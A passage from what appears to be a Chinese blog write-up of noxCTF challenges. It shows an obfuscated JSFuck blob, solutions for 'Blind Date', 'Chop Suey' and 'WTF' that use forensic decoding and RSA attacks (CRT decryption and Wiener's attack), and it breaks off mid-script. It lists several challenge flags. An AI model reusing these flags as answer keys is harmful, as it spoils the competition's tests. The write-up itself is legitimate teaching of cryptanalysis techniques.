+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+(!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])+[])+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()</span><br></pre></td></tr></table></figure></p><p>这不就是jsfuck吗，放到<a href="http://codertab.com/JsUnFuck跑一下，结果输出`nope`,事情远远没有想象的那么简单。经过仔细查看这些“空白”，发现不仅仅是空白，有很多空格，制表符之类的，Google查下，叫做Whitespace程序，[Whitespace](https://zh.wikipedia.org/wiki/Whitespace)是种深奥的编程语言。" target="_blank" rel="noopener">http://codertab.com/JsUnFuck跑一下，结果输出`nope`,事情远远没有想象的那么简单。经过仔细查看这些“空白”，发现不仅仅是空白，有很多空格，制表符之类的，Google查下，叫做Whitespace程序，[Whitespace](https://zh.wikipedia.org/wiki/Whitespace)是种深奥的编程语言。</a></p><p>这个<a href="https://vii5ard.github.io/whitespace/" target="_blank" rel="noopener">网站</a>可以在线解密,</p><p>最后flag：<code>noxCTF{DaFuckIsWHITESPACE}</code></p><h2 id="Blind-Date"><a href="#Blind-Date" class="headerlink" title="Blind Date"></a>Blind Date</h2><p>题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">My mom got me a date with someone! she sent me an image but i cannot open it. I don&apos;t want it to be a blind date. Can you help me?</span><br></pre></td></tr></table></figure></p><p>这真的是个脑洞题！下载一个图片，又是打不开的文件，查看下格式</p><p><img src="https://i.loli.net/2018/09/09/5b951731eaa60.png" alt="打不开的图片.png"></p><p>跟正常文件比下</p><p><img src="https://i.loli.net/2018/09/09/5b9517a145efa.png" alt="正常.png"></p><p>确实不一样哦！写个脚本试试恢复看看<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">'BlindDate.jpeg'</span>, <span class="string">"rb"</span>)</span><br><span class="line">s = f.read()</span><br><span class="line">f.close()</span><br><span class="line">data = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(s),<span class="number">4</span>):</span><br><span class="line">    data += s[i:i+<span class="number">4</span>][::<span class="number">-1</span>]</span><br><span class="line">file = open(<span class="string">'blind.jpeg'</span>,<span class="string">'wb'</span>)</span><br><span class="line">file.write(data)</span><br></pre></td></tr></table></figure></p><p>得到这样一个沙雕图片</p><p><img src="https://i.loli.net/2018/09/09/5b951872316e5.jpeg" alt="blind.jpeg"></p><p>按照套路，binwalk跑一下</p><p><img src="https://i.loli.net/2018/09/09/5b9518fb774d1.png" alt="3.png"></p><p>有个zip文件，分离下，得到压缩文件，可是。。要密码，这要我去哪里找密码啊？</p><p><img src="https://i.loli.net/2018/09/09/5b9519aa309bb.jpeg" alt=""></p><p>再次看看那个盲人图片，strings分析之后得到一些奇怪的东西<code>Li4gICAuICAuLiAgLi4gICAuICAuLiAgLi4gICAuICAuLiAgLiAgLi4NCi4gICAgLiAgIC4gICAgICAgLiAgICAgIC4gICAgLiAgIC4gIC4gIA0KICAgIC4uICAgICAgICAgIC4uICAgICAgLiAgIC4uICAgICAgLiAgLgPK</code></p><p><img src="https://i.loli.net/2018/09/09/5b951a1cafa23.png" alt=""></p><p>尝试base64解密之后有得到这些奇怪的东西<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">..   .  ..  ..   .  ..  ..   .  ..  .  ..</span><br><span class="line">.    .   .       .      .    .   .  .  </span><br><span class="line">    ..          ..      .   ..      .  .</span><br></pre></td></tr></table></figure></p><p>摩尔斯？不像。那是啥？莫非是盲文！！<br>盲文解密之后为<code>F4C3P4LM</code>，试下解密zip，打开了！！高兴。又得到下面的东西。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++.+.+++++++++.&lt;---.+++++++++++++++++.--------------.&gt;+++.&lt;+++++++++++++++++.&lt;++++++++++++++++++.&gt;&gt;------.---------.--------.-----.++++++++++++++++++++++++++.&lt;&lt;.&gt;&gt;----.&lt;++++++++.+++.&gt;---------.&lt;&lt;+.&gt;&gt;++.&lt;++.-----.+++++.&lt;+++.&gt;&gt;++++++.&lt;&lt;-.&gt;-----.&lt;+.&gt;.+++.&gt;--------.&lt;&lt;---.&gt;&gt;++.&lt;++.-----.+++++.&lt;+++.&gt;&gt;++++++.&lt;&lt;-.++++++++++++.&gt;&gt;+++++++++.&lt;&lt;&lt;++++++++++++++++++++++.</span><br></pre></td></tr></table></figure><p>这个我知道是brainfuck，拿到<a href="https://sange.fi/esoteric/brainfuck/impl/interp/i.html" target="_blank" rel="noopener">网站</a>上面解密下.</p><p>flag:<code>noxCTF{W0uld_y0u_bl1nd_d4t3_4_bl1nd_d4t3?}</code></p><h2 id="Chop-Suey"><a href="#Chop-Suey" class="headerlink" title="Chop Suey"></a>Chop Suey</h2><p>题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Today I ate in a Chinese restaurant and got myself a fortune cookie. These things usually contain a note with a nice sentence or phrase, but mine had numbers in it instead! Can you help me find the meaning of the numbers?</span><br><span class="line"></span><br><span class="line">p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 </span><br><span class="line"></span><br><span class="line">q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 </span><br><span class="line"></span><br><span class="line">dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 </span><br><span class="line"></span><br><span class="line">dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 </span><br><span class="line"></span><br><span class="line">c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span><br></pre></td></tr></table></figure></p><p>这个考的是中国剩余定理,参考这篇文章，<a href="https://www.rootnetsec.com/picoctf-weird-rsa/" target="_blank" rel="noopener">https://www.rootnetsec.com/picoctf-weird-rsa/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> crypto_commons.rsa.rsa_commons <span class="keyword">import</span> modinv, rsa_printable</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span></span><br><span class="line">q = <span class="number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span></span><br><span class="line"></span><br><span class="line">dp = <span class="number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span></span><br><span class="line">dq = <span class="number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span></span><br><span class="line"></span><br><span class="line">qinv = modinv(q, p)</span><br><span class="line">m1 = pow(c, dp, p)</span><br><span class="line">m2 = pow(c, dq, q)</span><br><span class="line">h = (qinv * (m1 - m2)) % p</span><br><span class="line">m = m2 + h * q</span><br><span class="line">str=hex(m)</span><br><span class="line">str=str[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join([chr(int(<span class="string">''</span>.join(c), <span class="number">16</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> zip(str[<span class="number">0</span>::<span class="number">2</span>],str[<span class="number">1</span>::<span class="number">2</span>])])</span><br></pre></td></tr></table></figure><p><a href="https://github.com/p4-team/crypto-commons" target="_blank" rel="noopener">https://github.com/p4-team/crypto-commons</a><br>下载这个库，<code>sudo python setup.py install</code>安装下。</p><p>flag:<code>noxCTF{W31c0m3_70_Ch1n470wn}</code></p><h2 id="WTF"><a href="#WTF" class="headerlink" title="WTF"></a>WTF</h2><p>题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Um uhhhhhhhhh WTF IS THIS?! I give up. Now you try to solve this.</span><br><span class="line"></span><br><span class="line">N = lObAbAbSBlZOOEBllOEbblTlOAbOlTSBATZBbOSAEZTZEAlSOggTggbTlEgBOgSllEEOEZZOSSAOlBlAgBBBBbbOOSSTOTEOllbZgElgbZSZbbSTTOEBZZSBBEEBTgESEgAAAlAOAEbTZBZZlOZSOgBAOBgOAZEZbOBZbETEOSBZSSElSSZlbBSgbTBOTBSBBSOZOAEBEBZEZASbOgZBblbblTSbBTObAElTSTOlSTlATESEEbSTBOlBlZOlAOETAZAgTBTSAEbETZOlElBEESObbTOOlgAZbbOTBOBEgAOBAbZBObBTg</span><br><span class="line"></span><br><span class="line">e = lBlbSbTASTTSZTEASTTEBOOAEbEbOOOSBAgABTbZgSBAZAbBlBBEAZlBlEbSSSETAlSOlAgAOTbETAOTSZAZBSbOlOOZlZTETAOSSSlTZOElOOABSZBbZTSAZSlASTZlBBEbEbOEbSTAZAZgAgTlOTSEBEAlObEbbgZBlgOEBTBbbSZAZBBSSZBOTlTEAgBBSZETAbBgEBTATgOZBTllOOSSTlSSTOSSZSZAgSZATgbSOEOTgTTOAABSZEZBEAZBOOTTBSgSZTZbOTgZTTElSOATOAlbBZTBlOTgOSlETgTBOglgETbT</span><br><span class="line"></span><br><span class="line">c = SOSBOEbgOZTZBEgZAOSTTSObbbbTOObETTbBAlOSBbABggTOBSObZBbbggggZZlbBblgEABlATBESZgASBbOZbASbAAOZSSgbAOZlEgTAlgblBTbBSTAEBgEOEbgSZgSlgBlBSZOObSlgAOSbbOOgEbllAAZgBATgEAZbBEBOAAbZTggbOEZSSBOOBZZbAAlTBgBOglTSSESOTbbSlTAZATEOZbgbgOBZBBBBTBTOSBgEZlOBTBSbgbTlZBbbOBbTSbBASBTlglSEAEgTOSOblAbEgBAbOlbOETAEZblSlEllgTTbbgb</span><br></pre></td></tr></table></figure></p><p>看见<code>e</code>的这么大的值，它可能是Wiener攻击或变体，但是用一种不知道是什么的编码进行了加密，仔细看看这个<code>e</code>的值，我们发现他有一个特点:</p><p><code>[&#39;A&#39;, &#39;b&#39;, &#39;E&#39;, &#39;g&#39;, &#39;l&#39;, &#39;O&#39;, &#39;S&#39;, &#39;B&#39;, &#39;T&#39;, &#39;Z&#39;]</code></p><p>只有这十个字符组成，于是有了个大胆的想法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&apos;O&apos; --&gt; 0</span><br><span class="line">&apos;l&apos; --&gt; 1</span><br><span class="line">&apos;Z&apos; --&gt; 2</span><br><span class="line">&apos;E&apos; --&gt; 3</span><br><span class="line">&apos;A&apos; --&gt; 4</span><br><span class="line">&apos;S&apos; --&gt; 5</span><br><span class="line">&apos;b&apos; --&gt; 6</span><br><span class="line">&apos;T&apos; --&gt; 7</span><br><span class="line">&apos;B&apos; --&gt; 8</span><br><span class="line">&apos;g&apos; --&gt; 9</span><br></pre></td></tr></table></figure></p><p>将<code>e</code>解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jiemi</span><span class="params">(str1)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">"AbEglOSBTZ"</span>:</span><br><span class="line">            <span class="keyword">print</span> i</span><br><span class="line">    str1 = str1.replace(<span class="string">"O"</span>, <span class="string">'0'</span>)</span><br><span class="line">    str1 = str1.replace(<span class="string">"l"</span>, <span class="string">'1'</span>)</span><br><span class="line">    str1 = str1.replace(<span class="string">"Z"</span>, <span class="string">'2'</span>)</span><br><span class="line">    str1 = str1.replace(<span class="string">"E"</span>, <span class="string">'3'</span>)</span><br><span class="line">    str1 = str1.replace(<span class="string">"A"</span>, <span class="string">'4'</span>)</span><br><span class="line">    str1 = str1.replace(<span class="string">"S"</span>, <span class="string">'5'</span>)</span><br><span class="line">    str1 = str1.replace(<span class="string">"b"</span>, <span class="string">'6'</span>)</span><br><span class="line">    str1 = str1.replace(<span class="string">"T"</span>, <span class="string">'7'</span>)</span><br><span class="line">    str1 = str1.replace(<span class="string">"B"</span>, <span class="string">'8'</span>)</span><br><span class="line">    str1 = str1.replace(<span class="string">"g"</span>, <span class="string">'9'</span>)</span><br><span class="line">    <span class="keyword">return</span> str1</span><br></pre></td></tr></table></figure><p>得到<code>e=18165674577527345773800436360005849487629584246818834218136555374150149407637407524285601002127374055517203100485286275425145721883636036574242949710753834106366928190387866524288552807173498852374689387479028711005571557055252495247965030797704485232834280077859527260792773150470416827810790513797809193767</code></p><p>再利用<a href="https://github.com/pablocelayes/rsa-wiener-attack" target="_blank" rel="noopener">winner attack</a>攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="string">'lObAbAbSBlZOOEBllOEbblTlOAbOlTSBATZBbOSAEZTZEAlSOggTggbTlEgBOgSllEEOEZZOSSAOlBlAgBBBBbbOOSSTOTEOllbZgElgbZSZbbSTTOEBZZSBBEEBTgESEgAAAlAOAEbTZBZZlOZSOgBAOBgOAZEZbOBZbETEOSBZSSElSSZlbBSgbTBOTBSBBSOZOAEBEBZEZASbOgZBblbblTSbBTObAElTSTOlSTlATESEEbSTBOlBlZOlAOETAZAgTBTSAEbETZOlElBEESObbTOOlgAZbbOTBOBEgAOBAbZBObBTg'</span></span><br><span class="line"></span><br><span class="line">e = <span class="string">'lBlbSbTASTTSZTEASTTEBOOAEbEbOOOSBAgABTbZgSBAZAbBlBBEAZlBlEbSSSETAlSOlAgAOTbETAOTSZAZBSbOlOOZlZTETAOSSSlTZOElOOABSZBbZTSAZSlASTZlBBEbEbOEbSTAZAZgAgTlOTSEBEAlObEbbgZBlgOEBTBbbSZAZBBSSZBOTlTEAgBBSZETAbBgEBTATgOZBTllOOSSTlSSTOSSZSZAgSZATgbSOEOTgTTOAABSZEZBEAZBOOTTBSgSZTZbOTgZTTElSOATOAlbBZTBlOTgOSlETgTBOglgETbT'</span></span><br><span class="line"></span><br><span class="line">c = <span 